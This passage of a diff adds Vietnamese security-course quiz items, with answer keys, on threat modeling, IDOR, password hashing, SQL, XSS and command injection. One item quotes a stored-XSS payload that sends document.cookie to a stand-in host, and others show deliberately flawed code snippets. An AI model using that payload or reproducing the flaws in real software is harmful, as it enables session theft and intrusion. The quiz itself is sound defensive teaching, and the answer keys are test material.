@@ -33503,5 +33503,1959 @@
       1
     ],
     "explanation": "Bài nói Lambda là one-way-door hơn vì lock-in vào model của AWS (khó đảo ngược) nhưng đổi lại vận hành ~0; container dùng image chuẩn giữ tính đảo-ngược cao hơn.\n✓ Lambda lock-in vào model AWS nên khó đảo ngược, vận hành ~0 là lý do đúng.\n✗ Tốc độ không phải lý do bài đưa ra cho 'one-way door'.\n✗ Container chạy được trên AWS qua ECS/EKS — đó chính là lựa chọn so sánh.\n✗ Vấn đề là portability/lock-in, không phải giá license."
+  },
+  {
+    "id": "sec-q-001",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Theo bài học, câu hỏi nào là cách tiếp cận bảo mật đúng đắn cho kỹ sư?",
+    "options": [
+      "\"Hệ thống này có an toàn tuyệt đối không?\"",
+      "\"Tài sản nào quan trọng nhất, kẻ tấn công nào có động cơ, và tôi chấp nhận rủi ro nào?\"",
+      "\"Làm sao để không bao giờ bị tấn công?\"",
+      "\"Đã bật firewall chưa là xong?\""
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Bảo mật là quản lý rủi ro, không phải đạt trạng thái hoàn hảo.\n✓ Hỏi về tài sản, động cơ kẻ tấn công và rủi ro chấp nhận được là tư duy quản lý rủi ro đúng.\n✗ Hỏi về an toàn tuyệt đối là vô nghĩa vì không hệ thống nào an toàn tuyệt đối.\n✗ \"Không bao giờ bị tấn công\" là mục tiêu phi thực tế.\n✗ Bật firewall chỉ là một lớp, không phản ánh tư duy rủi ro."
+  },
+  {
+    "id": "sec-q-002",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Một query không giới hạn làm sập DB khiến hệ thống không phục vụ được. Thuộc tính nào trong CIA triad bị vi phạm?",
+    "options": [
+      "Confidentiality",
+      "Integrity",
+      "Availability",
+      "Authentication"
+    ],
+    "correctIndices": [
+      2
+    ],
+    "explanation": "Hệ thống không dùng được khi cần chính là vi phạm Availability.\n✓ Availability là khả năng hệ thống dùng được khi cần; DDoS, ransomware, query làm sập DB đều phá vỡ nó.\n✗ Confidentiality liên quan đến lộ dữ liệu, không phải mất khả năng phục vụ.\n✗ Integrity là dữ liệu bị sửa trái phép.\n✗ Authentication không nằm trong CIA triad."
+  },
+  {
+    "id": "sec-q-003",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Frontend đã chặn order số lượng âm. Kẻ tấn công gửi `curl -X POST .../orders -d '{\"quantity\": -5, \"price\": 0.01}'`. Vì sao đây là lỗ hổng và cách sửa đúng là gì?",
+    "options": [
+      "Frontend cần thêm validation JavaScript chặt hơn",
+      "Backend phải validate lại vì dữ liệu vượt trust boundary, và server tự tra giá từ DB",
+      "Cần mã hoá request body để client không sửa được",
+      "Thêm CAPTCHA vào form đặt hàng"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Frontend chạy trên máy kẻ tấn công nên mọi check phía client bị bỏ qua; phải validate lại ở server và không tin giá từ client.\n✓ Dữ liệu vượt trust boundary (browser → backend) phải được kiểm lại ở server, và server tự tra giá từ DB thay vì tin client.\n✗ Thêm validation frontend vô dụng vì kẻ tấn công gọi thẳng API bằng curl, bỏ qua frontend.\n✗ Mã hoá request body không ngăn được client tự tạo request hợp lệ với giá trị độc hại.\n✗ CAPTCHA chống bot nhưng không validate giá trị nghiệp vụ."
+  },
+  {
+    "id": "sec-q-004",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "`GET /orders/123` cho phép một user đọc đơn hàng của người khác chỉ bằng cách đổi số ID. Đây là loại threat nào trong STRIDE và phòng thủ chính là gì?",
+    "options": [
+      "Spoofing — dùng MFA",
+      "Information Disclosure (IDOR) — kiểm `order.userId == currentUser.id`",
+      "Denial of Service — rate limit",
+      "Tampering — ký dữ liệu bằng HMAC"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "IDOR đọc data người khác là lộ thông tin, thuộc Information Disclosure, phòng thủ bằng authorization kiểm chủ sở hữu.\n✓ IDOR là Information Disclosure; phòng thủ là kiểm quyền sở hữu order.userId == currentUser.id trên server.\n✗ Spoofing là giả danh danh tính, MFA không giải quyết việc đọc tài nguyên của người khác sau khi đã đăng nhập.\n✗ DoS là làm ngừng phục vụ, không phải đọc trộm dữ liệu.\n✗ Tampering là sửa dữ liệu trái phép, còn đây là đọc trái phép."
+  },
+  {
+    "id": "sec-q-005",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn code sau có vấn đề gì?\n\n```python\ndef can_access(user, resource):\n    try:\n        return auth_service.check(user, resource)\n    except Exception:\n        return True\n```",
+    "options": [
+      "Thiếu cache nên chậm",
+      "Fail open: lỗi khi check quyền lại cho qua, nên sửa thành return False và log lại",
+      "Không bắt được đủ loại exception",
+      "Nên dùng async để tăng hiệu năng"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Khi check quyền lỗi mà trả True là fail open, mở toang cho kẻ tấn công; phải fail secure bằng cách từ chối.\n✓ Lỗi authz mà return True là fail open thảm hoạ; sửa thành return False (mặc định từ chối) và log lại để điều tra.\n✗ Vấn đề không phải hiệu năng/cache.\n✗ Loại exception không phải gốc rễ; hành vi khi lỗi mới là vấn đề.\n✗ Async không liên quan đến lỗ hổng bảo mật này."
+  },
+  {
+    "id": "sec-q-006",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Một hệ thống mở cửa thoát hiểm tự động khi có cháy. Theo nguyên tắc \"fail securely\", khi bộ điều khiển gặp lỗi thì cửa nên hành xử thế nào?",
+    "options": [
+      "Luôn fail closed (khoá cửa) vì đó mới là an toàn",
+      "Fail open (mở cửa) vì với hệ thống ưu tiên availability tính mạng, mở mới an toàn",
+      "Giữ nguyên trạng thái cuối cùng bất kể ngữ cảnh",
+      "Báo lỗi và chờ admin quyết định thủ công"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "\"Fail securely\" không phải lúc nào cũng là \"fail closed\"; phải chọn hướng hỏng đúng theo ngữ cảnh.\n✓ Với hệ thống mà availability/tính mạng là tối thượng (cửa thoát hiểm khi cháy), fail open mới là an toàn.\n✗ Fail closed khoá cửa khi cháy sẽ gây nguy hiểm tính mạng, sai ngữ cảnh.\n✗ Giữ nguyên trạng thái không đảm bảo an toàn và mâu thuẫn với việc cần threat-model trước.\n✗ Chờ admin thủ công không khả thi trong tình huống khẩn cấp cháy."
+  },
+  {
+    "id": "sec-q-007",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Trong sơ đồ DFD, theo bài học, dấu hiệu nào cho thấy bạn vừa tìm ra một threat?",
+    "options": [
+      "Một process gọi một process khác cùng vùng tin cậy",
+      "Một data flow cắt qua trust boundary mà thiếu authentication, validation hoặc mã hoá",
+      "Một data store được vẽ bằng hai gạch song song",
+      "Một external entity được vẽ bằng hình chữ nhật"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Mỗi mũi tên cắt qua trust boundary bắt buộc có auth, validation và mã hoá; thiếu một trong ba là một threat.\n✓ Flow vượt boundary mà thiếu authentication/validation/mã hoá chính là nơi tìm ra threat.\n✗ Gọi trong cùng vùng tin cậy không nhất thiết vượt boundary (dù vẫn nên cảnh giác Zero Trust).\n✗ Hai gạch song song chỉ là ký hiệu của data store, không phải threat.\n✗ Hình chữ nhật chỉ là ký hiệu external entity, không phải threat."
+  },
+  {
+    "id": "sec-q-008",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Trong code đặt hàng đã sửa, vì sao `userId` được lấy từ `req.auth.userId` thay vì `req.body.userId`?",
+    "options": [
+      "Để giảm dung lượng request body",
+      "Để tránh Spoofing/Elevation: client không được tự khai danh tính, phải lấy từ token đã xác thực",
+      "Vì token nhanh hơn đọc từ body",
+      "Để hỗ trợ nhiều ngôn ngữ lập trình"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Tin userId từ body cho phép client mạo danh người khác (Spoofing) hoặc nâng quyền (Elevation); phải lấy từ token đã xác thực.\n✓ Lấy userId từ token chống Spoofing + Elevation vì client không thể tự khai mình là ai.\n✗ Mục tiêu không phải giảm dung lượng request.\n✗ Hiệu năng đọc token không phải lý do bảo mật.\n✗ Đa ngôn ngữ không liên quan đến quyết định này."
+  },
+  {
+    "id": "sec-q-009",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Theo bài, biện pháp nào là \"nguyên tắc số một và rẻ nhất\" trong toàn bộ bảo mật?",
+    "options": [
+      "Mua WAF đắt tiền nhất",
+      "Giảm attack surface — cánh cửa không tồn tại thì không cần khoá",
+      "Mã hoá mọi thứ bằng thuật toán mạnh nhất",
+      "Thuê pentester chuyên nghiệp"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Giảm attack surface là nguyên tắc số một và rẻ nhất; cửa không tồn tại thì không cần khoá.\n✓ Xoá endpoint/input/dependency không cần thiết loại bỏ luôn rủi ro mà không tốn chi phí phòng thủ.\n✗ Mua WAF đắt là một lớp phòng thủ, không phải giảm bề mặt tấn công.\n✗ Mã hoá mạnh bảo vệ confidentiality nhưng không giảm số cửa.\n✗ Thuê pentester là phát hiện lỗ hổng, không phải giảm attack surface một cách chủ động."
+  },
+  {
+    "id": "sec-q-010",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Defense in Depth giả định mỗi lớp sẽ thủng. Trong chuỗi WAF → Auth → AuthZ → Validate → DB user, nếu mọi lớp trên đều bị vượt qua, những lựa chọn nào dưới đây giúp giới hạn thiệt hại?",
+    "options": [
+      "DB user chỉ có quyền SELECT trên đúng schema cần thiết thay vì GRANT ALL",
+      "Mã hoá at-rest cho dữ liệu nhạy cảm",
+      "Cấp DB user quyền DROP TABLE để dễ vận hành",
+      "Bỏ luôn validation vì đằng nào WAF cũng chặn",
+      "Audit log để phát hiện và điều tra sự cố"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      4
+    ],
+    "explanation": "Least privilege và các lớp sâu (mã hoá, audit) giới hạn blast radius khi các lớp ngoài đã vỡ.\n✓ DB user chỉ SELECT trên schema cần thiết chặn được phá huỷ dữ liệu ngay cả khi mọi lớp trên thủng.\n✓ Mã hoá at-rest là một lớp sâu giúp bảo vệ confidentiality khi các lớp trên vỡ.\n✓ Audit log giúp phát hiện và điều tra, biến \"mất sạch\" thành \"phát hiện được, khôi phục được\".\n✗ Cấp quyền DROP TABLE phá vỡ least privilege, làm thiệt hại lan rộng khi bị chiếm.\n✗ Bỏ validation vì tin WAF mâu thuẫn với giả định \"mỗi lớp sẽ thủng\"."
+  },
+  {
+    "id": "sec-q-011",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Khi ánh xạ threat model sang AWS, những cặp khái niệm–dịch vụ nào là đúng theo bài học?",
+    "options": [
+      "Least Privilege / authorization → IAM policy tối thiểu, IAM Roles, SCP",
+      "Repudiation, audit log bất biến → CloudTrail ghi mọi API call",
+      "Confidentiality, mã hoá → KMS và Secrets Manager",
+      "Phát hiện threat (giám sát) → chỉ cần bật S3 versioning",
+      "Attack surface, lọc input độc → Cognito quản lý MFA"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Mỗi control AWS ánh xạ đúng một khái niệm threat model theo bảng trong bài.\n✓ IAM policy tối thiểu, IAM Roles, SCP phục vụ least privilege và authorization.\n✓ CloudTrail ghi mọi API call phục vụ non-repudiation/audit log bất biến.\n✓ KMS và Secrets Manager phục vụ confidentiality và chống lộ secret.\n✗ Phát hiện threat dùng GuardDuty/Security Hub/Inspector/Macie, không phải chỉ S3 versioning.\n✗ Cognito phục vụ Spoofing/xác thực mạnh; lọc input độc ở rìa là WAF/Shield."
+  },
+  {
+    "id": "sec-q-012",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Trong vòng lặp bảo mật, vì sao một hệ thống \"an toàn hôm nay\" có thể \"thủng ngày mai\" dù không ai động vào code của bạn?",
+    "options": [
+      "Vì code tự xuống cấp theo thời gian",
+      "Vì một CVE mới được công bố trong dependency, hoặc kỹ thuật tấn công mới ra đời",
+      "Vì server tự khởi động lại",
+      "Vì người dùng quên mật khẩu"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Bảo mật là quá trình liên tục vì bối cảnh bên ngoài thay đổi dù code không đổi.\n✓ CVE mới trong dependency hoặc kỹ thuật tấn công mới khiến hệ thống thủng mà không cần ai sửa code.\n✗ Code không tự xuống cấp; vấn đề đến từ môi trường bên ngoài.\n✗ Server khởi động lại không liên quan đến lỗ hổng mới.\n✗ Người dùng quên mật khẩu không làm hệ thống an toàn thành không an toàn."
+  },
+  {
+    "id": "sec-q-013",
+    "courseId": "SECURITY",
+    "lesson": "sec-01-threat-modeling",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Sau khi threat-model API đặt hàng, bạn quyết định KHÔNG xử lý ngay một threat có khả năng thấp. Theo bước 4, cách xử lý đúng cho threat chấp nhận tạm là gì?",
+    "options": [
+      "Bỏ qua hoàn toàn vì đã chấp nhận rủi ro",
+      "Thêm giám sát/alert (ví dụ nhiều 403 từ một user → dấu hiệu đang dò IDOR)",
+      "Xoá threat đó khỏi tài liệu cho gọn",
+      "Tắt endpoint liên quan để cho chắc"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Đánh giá theo khả năng xảy ra × thiệt hại; threat chấp nhận tạm cần được giám sát chứ không bỏ mặc.\n✓ Thêm alert (nhiều 422, nhiều 403 từ một user) giúp phát hiện sớm khi threat bắt đầu bị khai thác.\n✗ Bỏ qua hoàn toàn khiến bạn mù trước khi sự cố xảy ra.\n✗ Xoá khỏi tài liệu làm mất dấu vết để xem lại sau incident.\n✗ Tắt endpoint có thể phá vỡ chức năng cần thiết; không phải lựa chọn mặc định cho rủi ro thấp."
+  },
+  {
+    "id": "sec-q-014",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Người dùng đã đăng nhập gọi GET /api/invoices/1001 thấy hóa đơn của mình, rồi đổi thành /api/invoices/1002 và xem được hóa đơn của người khác. Đây là loại lỗ hổng nào?",
+    "options": [
+      "IDOR — Insecure Direct Object Reference (thiếu kiểm tra quyền sở hữu)",
+      "SQL Injection qua tham số id",
+      "Cross-Site Scripting phản chiếu",
+      "Session fixation"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Server chỉ kiểm tra \"đã đăng nhập\" mà không kiểm tra resource có thuộc về người dùng hay không — đó là IDOR, một dạng Broken Access Control.\n✓ Truy cập object của người khác chỉ bằng cách đổi ID là IDOR, lỗi authorization.\n✗ Không có chuỗi độc hại nào được nối vào SQL ở đây.\n✗ Không có script nào được nhét vào trình duyệt.\n✗ Không liên quan đến việc đặt sẵn hay không xoay session ID."
+  },
+  {
+    "id": "sec-q-015",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Endpoint sau bị IDOR. Cách sửa đúng tinh thần bài học là gì?\n\napp.get(\"/api/invoices/:id\", requireAuth, async (req,res) => {\n  const inv = await db.invoice.findById(req.params.id);\n  res.json(inv);\n});",
+    "options": [
+      "Ràng buộc truy vấn theo chủ sở hữu lấy từ session: findOne({ id: req.params.id, ownerId: req.user.id })",
+      "Đổi sang dùng UUID khó đoán cho id của invoice",
+      "Đọc ownerId từ req.body rồi so sánh với id trong URL",
+      "Thêm header CORS chặt để chỉ domain của mình gọi được"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Phải lọc resource theo chủ thể lấy từ session/token phía server, không tin dữ liệu client.\n✓ Ràng buộc ownerId = req.user.id ngay trong truy vấn đảm bảo chỉ chủ sở hữu đọc được.\n✗ UUID khó đoán chỉ là security through obscurity, không thay được kiểm tra quyền.\n✗ Lấy ownerId từ body là tin dữ liệu client — kẻ tấn công gửi ownerId tùy ý.\n✗ CORS không ngăn được người dùng hợp lệ tự gọi API đổi id."
+  },
+  {
+    "id": "sec-q-016",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Trang /admin/users bị ẩn khỏi menu của user thường, nhưng endpoint POST /api/admin/users/:id/ban chỉ có @require_auth. Vấn đề thực sự là gì?",
+    "options": [
+      "Access control dựa vào việc ẩn UI; API thiếu kiểm tra vai trò ở server nên user thường đoán URL là ban được người khác",
+      "Thiếu rate-limit nên endpoint bị brute-force",
+      "Thiếu parameterize nên :id gây SQL Injection",
+      "Cookie session thiếu cờ HttpOnly"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Đây là Missing Function-Level Access Control: UI chỉ là gợi ý, kiểm tra quyền phải nằm ở server.\n✓ Ẩn nút không phải cơ chế bảo mật; API cần @require_role(\"admin\") deny-by-default.\n✗ Vấn đề không phải số lần thử mà là thiếu kiểm tra vai trò.\n✗ Lỗ hổng nằm ở authorization, không phải cách build câu SQL.\n✗ HttpOnly liên quan XSS/cookie, không phải kiểm soát chức năng admin."
+  },
+  {
+    "id": "sec-q-017",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Chọn TẤT CẢ phát biểu ĐÚNG về xử lý Broken Access Control theo bài học.",
+    "options": [
+      "Mass assignment (db.user.update(req.body)) cho phép kẻ tấn công thêm \"role\":\"admin\" để tự nâng quyền nếu không whitelist field",
+      "Nên trả 404 thay vì 403 khi không tìm thấy resource hợp lệ để không lộ sự tồn tại",
+      "Dùng ID dạng UUID khó đoán là đủ thay thế cho kiểm tra quyền sở hữu",
+      "Authorization nên áp dụng tập trung (middleware/policy) và bật mặc định theo deny-by-default",
+      "Đặt Access-Control-Allow-Origin: * cho API có credentials là cấu hình an toàn"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      3
+    ],
+    "explanation": "Bài nhấn mạnh whitelist field, deny-by-default, authorization tập trung và 404 để không lộ tồn tại.\n✓ Không whitelist field cập nhật dẫn tới mass assignment nâng quyền.\n✓ Trả 404 giúp giấu sự tồn tại của resource.\n✓ Authorization tập trung, bật mặc định là nguyên tắc cốt lõi.\n✗ UUID khó đoán chỉ là obscurity, không thay kiểm tra quyền.\n✗ Allow-Origin: * cho API có credentials là cấu hình lỏng lẻo, nguy hiểm."
+  },
+  {
+    "id": "sec-q-018",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn lưu mật khẩu này có gì sai?\n\nconst hash = crypto.createHash(\"sha256\").update(password).digest(\"hex\");",
+    "options": [
+      "SHA-256 quá nhanh (GPU thử hàng tỉ lần/giây) và không salt, nên dễ bị brute-force/rainbow table",
+      "SHA-256 không đủ độ dài output nên dễ bị va chạm",
+      "SHA-256 đảo ngược được nên lộ mật khẩu gốc ngay",
+      "Thiếu mã hóa AES nên mật khẩu không được bảo vệ"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Mật khẩu cần hàm hash chậm, có salt, chuyên dụng như Argon2id/bcrypt/scrypt.\n✓ SHA-256 trần rất nhanh và không salt nên GPU brute-force và rainbow table khôi phục được hàng loạt mật khẩu.\n✗ Vấn đề không phải độ dài output hay va chạm.\n✗ SHA-256 là hàm một chiều, không đảo ngược được trực tiếp; vấn đề là tốc độ.\n✗ Mật khẩu cần hash một chiều, không phải mã hóa AES đảo ngược được."
+  },
+  {
+    "id": "sec-q-019",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Theo bảng phân biệt trong bài, kỹ thuật nào dùng để bảo vệ thẻ tín dụng/PII cần đọc lại được sau này (at rest)?",
+    "options": [
+      "Encryption (AES-256-GCM), đảo ngược được khi có key",
+      "Hashing chậm Argon2id, không đảo ngược",
+      "Encoding Base64",
+      "HMAC chữ ký số"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Dữ liệu cần đọc lại phải mã hóa bằng thuật toán đảo ngược được với key.\n✓ AES-256-GCM mã hóa at rest, giải mã lại được khi có key — đúng cho thẻ/PII.\n✗ Hashing không đảo ngược được nên không dùng cho dữ liệu cần đọc lại.\n✗ Base64 chỉ là biểu diễn dữ liệu, ai cũng đảo được, không phải bảo mật.\n✗ HMAC/chữ ký dùng cho toàn vẹn, không khôi phục nội dung gốc."
+  },
+  {
+    "id": "sec-q-020",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một dev \"bảo mật\" token nhạy cảm bằng cách Base64 nó, và nhét secret vào JWT claim vì \"JWT đã được ký\". Nhận định đúng là gì?",
+    "options": [
+      "Cả hai đều sai: Base64 đảo ngược tức thì (atob), và JWT mặc định chỉ ký chứ không mã hóa payload",
+      "Đúng cả hai, vì Base64 là mã hóa nhẹ và JWT ký kèm mã hóa payload",
+      "Base64 an toàn nhưng JWT thì không",
+      "JWT an toàn nhưng Base64 thì không, nên chỉ cần bỏ Base64"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Base64 là encoding, JWT mặc định chỉ đảm bảo integrity (ký) chứ không che payload.\n✓ atob() đảo Base64 tức thì và JWT claim chỉ được ký, ai cũng đọc được payload.\n✗ Base64 không phải mã hóa và JWT không tự mã hóa payload.\n✗ Base64 không hề an toàn, đảo ngược ngay.\n✗ JWT cũng không che được secret trong claim, nên cả hai đều sai."
+  },
+  {
+    "id": "sec-q-021",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Câu lệnh sau bị SQL Injection. Cách sửa đúng và đáng tin nhất là gì?\n\nq = f\"SELECT * FROM users WHERE name = '{name}' AND pass = '{pw}'\"",
+    "options": [
+      "Dùng parameterized query: db.execute(\"... WHERE name = %s AND pass = %s\", (name, pw))",
+      "Lọc bỏ các ký tự xấu như ' và ; trong input trước khi nối chuỗi",
+      "Thay f-string bằng nối chuỗi cộng thường",
+      "Mã hóa name và pw bằng Base64 trước khi đưa vào câu lệnh"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Gốc rễ SQLi là trộn data với code; parameterize tách data khỏi câu lệnh.\n✓ Prepared statement gửi data tách biệt nên input không \"thoát\" ra thành code.\n✗ Blacklist ký tự luôn có cách bypass (encoding, Unicode tương đương), không đáng tin.\n✗ Nối chuỗi kiểu khác vẫn trộn data với code, vẫn vỡ.\n✗ Base64 không ngăn injection, driver vẫn diễn giải sau khi nối."
+  },
+  {
+    "id": "sec-q-022",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Cần truyền tên cột để sắp xếp động (ORDER BY) — thứ không parameterize được. Cách xử lý đúng theo bài là gì?",
+    "options": [
+      "Whitelist các tên cột được phép, chỉ chấp nhận giá trị nằm trong danh sách cho phép",
+      "Vẫn nối thẳng tên cột vào câu lệnh vì tên cột không phải dữ liệu người dùng quan trọng",
+      "Dùng parameterized query với placeholder cho tên cột",
+      "Lọc bỏ dấu cách và dấu nháy trong tên cột rồi nối vào"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Khi không parameterize được (tên bảng/cột động), bài học yêu cầu whitelist giá trị cho phép.\n✓ Chỉ chấp nhận tên cột thuộc danh sách định trước loại bỏ mọi giá trị độc.\n✗ Nối thẳng tên cột do client kiểm soát vẫn mở đường injection.\n✗ Placeholder của driver dùng cho giá trị, không cho định danh như tên cột.\n✗ Blacklist ký tự không đáng tin, luôn có cách bypass."
+  },
+  {
+    "id": "sec-q-023",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một comment lưu trong DB chứa <script>fetch('https://evil.tld/c?'+document.cookie)</script> và được render cho mọi người xem. Đây là loại XSS nào và phòng thủ trực tiếp nhất ở chỗ render là gì?",
+    "options": [
+      "Stored XSS; render bằng output encoding theo ngữ cảnh (vd textContent thay vì innerHTML), framework auto-escape",
+      "Reflected XSS; chỉ cần thêm rate-limit cho endpoint comment",
+      "DOM-based XSS; sửa bằng parameterized query",
+      "Stored XSS; sửa bằng cách Base64 nội dung comment trước khi lưu"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Payload được lưu vào DB rồi render cho người khác là Stored XSS; chống bằng output encoding đúng ngữ cảnh.\n✓ textContent không parse HTML và framework auto-escape ngăn script thực thi khi render.\n✗ Payload được lưu rồi phát lại nên là stored, không phải reflected; rate-limit không chặn XSS.\n✗ Không phải DOM-based, và parameterized query là chống SQLi không phải XSS.\n✗ Base64 không loại bỏ script khi giải mã lúc render."
+  },
+  {
+    "id": "sec-q-024",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Endpoint \"ping host\" chạy exec(`ping -c1 ${host}`). Chọn TẤT CẢ biện pháp đúng để chống command injection theo bài.",
+    "options": [
+      "Dùng execFile(\"ping\", [\"-c1\", host]) để truyền argv tách biệt, không qua shell",
+      "Validate host bằng allowlist regex, vd /^[a-zA-Z0-9.\\-]+$/",
+      "Tiếp tục dùng exec nhưng lọc bỏ ký tự ; và | khỏi host",
+      "Bọc host trong dấu nháy kép khi nối vào chuỗi lệnh",
+      "Chạy lệnh dưới quyền user thấp hơn để hạn chế tác hại"
+    ],
+    "correctIndices": [
+      0,
+      1
+    ],
+    "explanation": "Tách data khỏi code: truyền argv array không qua shell, cộng validate allowlist.\n✓ execFile với argv khiến ';', '|', '$()' chỉ còn là chuỗi thường, không bị shell diễn giải.\n✓ Allowlist regex cho host chặn input bất thường ở biên.\n✗ Blacklist ký tự khi vẫn qua shell có thể bị bypass, không đáng tin.\n✗ Bọc nháy vẫn nối chuỗi vào shell, kẻ tấn công thoát ra được.\n✗ Hạ quyền là giảm thiểu tác hại chung, không phải biện pháp chống injection mà bài nêu."
+  },
+  {
+    "id": "sec-q-025",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Đội bảo mật cần yếu tố thứ hai chống được phishing tận gốc, kể cả khi nạn nhân bị dụ vào trang giả. Theo bảng trong bài, nên chọn gì?",
+    "options": [
+      "Passkey / WebAuthn (FIDO2) — khóa gắn với origin, không gửi secret qua mạng",
+      "SMS OTP — đơn giản, người dùng đã quen",
+      "TOTP qua app authenticator — mã đổi mỗi 30 giây",
+      "Email OTP — gửi mã một lần qua email"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Chỉ passkey/WebAuthn chống phishing tận gốc nhờ ràng buộc origin và không gửi secret.\n✓ Private key ký challenge gắn với domain thật nên trang phishing domain khác không lấy được chữ ký hợp lệ.\n✗ SMS OTP không chống phishing, còn dễ SIM-swap.\n✗ TOTP vẫn bị phish realtime nếu user nhập mã vào trang giả.\n✗ Email OTP cũng có thể bị phish realtime, không ràng buộc origin."
+  },
+  {
+    "id": "sec-q-026",
+    "courseId": "SECURITY",
+    "lesson": "sec-02-owasp-top10-1",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Sau khi user đăng nhập thành công, ứng dụng giữ nguyên session ID đã cấp trước đó. Rủi ro là gì và cách khắc phục?",
+    "options": [
+      "Session fixation: kẻ tấn công đặt sẵn ID cho nạn nhân rồi dùng lại sau khi họ đăng nhập; khắc phục bằng regenerate session ID khi login",
+      "Credential stuffing; khắc phục bằng rate-limit theo IP",
+      "IDOR phiên làm việc; khắc phục bằng lọc theo ownerId",
